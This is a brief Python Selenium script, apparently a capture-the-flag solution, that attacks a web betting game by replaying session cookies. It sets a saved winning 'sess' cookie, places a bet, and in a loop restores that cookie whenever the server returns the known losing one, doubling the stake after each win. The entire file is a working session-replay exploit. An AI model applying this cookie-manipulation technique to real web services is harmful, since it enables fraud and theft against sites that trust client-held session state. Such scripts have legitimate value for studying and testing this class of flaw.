from selenium import webdriver
import time

driver = webdriver.Chrome('\\Users\\willi\\Downloads\\chromedriver')
driver.implicitly_wait(1)
driver.get('http://remote.goatskin.kr:5011/')

money=104857600
worst_cookie = '3dbba0a4a0d14f644c529fa7a7b44ff58ae6354233b40903d6096a59d7bc2b82'
best_cookie = '3b6c4f870114575a64a54092a8acf47b2b827b17b966c2671af1db928e95be61'
driver.add_cookie({'name':'sess','value':best_cookie})
driver.find_element_by_name('bet').send_keys(str(money))
driver.find_element_by_class_name('btn-primary').click()

while True:
    my_cookie = driver.get_cookies()[0]['value']
    if(my_cookie == worst_cookie) :
        driver.add_cookie({'name':'sess','value':best_cookie})
        time.sleep(5)
    else:
        best_cookie = my_cookie
        money = money*2

    print(best_cookie)
    driver.find_element_by_name('bet').send_keys(str(money))
    driver.find_element_by_class_name('btn-primary').click()
